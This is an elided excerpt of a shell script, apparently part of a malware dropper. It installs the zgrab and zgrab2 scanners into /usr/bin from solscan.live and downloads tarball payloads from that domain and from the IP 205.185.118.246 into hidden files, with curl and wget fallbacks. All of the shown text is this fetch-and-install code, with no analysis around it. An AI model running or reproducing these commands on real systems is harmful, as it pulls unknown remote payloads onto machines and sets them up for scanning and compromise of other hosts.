...
if ! type zgrab ;then
    ${WGET_CMD} http://solscan.live/bin/zgrab -O /usr/bin/zgrab && chmod a+x /usr/bin/zgrab
fi 
if ! type zgrab2 ;then
    ${WGET_CMD} http://solscan.live/bin/zgrab2 -O /usr/bin/zgrab2 && chmod a+x /usr/bin/zgrab2
fi 
...
rm -rf x1.tar.gz
sleep 1
${CURL_CMD} -sL -o x1.tar.gz http://205.185.118.246/tar/1.0.4.tar.gz || ${WGET_CMD} -q -O .x112 http://solscan.live/tar/1.0.4.tar.gz
sleep 1
...
${CURL_CMD} -sL -o .x112 http://solscan.live/tar/p.tar || ${WGET_CMD} -q -O .x112 http://solscan.live/tar/p.tar
sleep 1
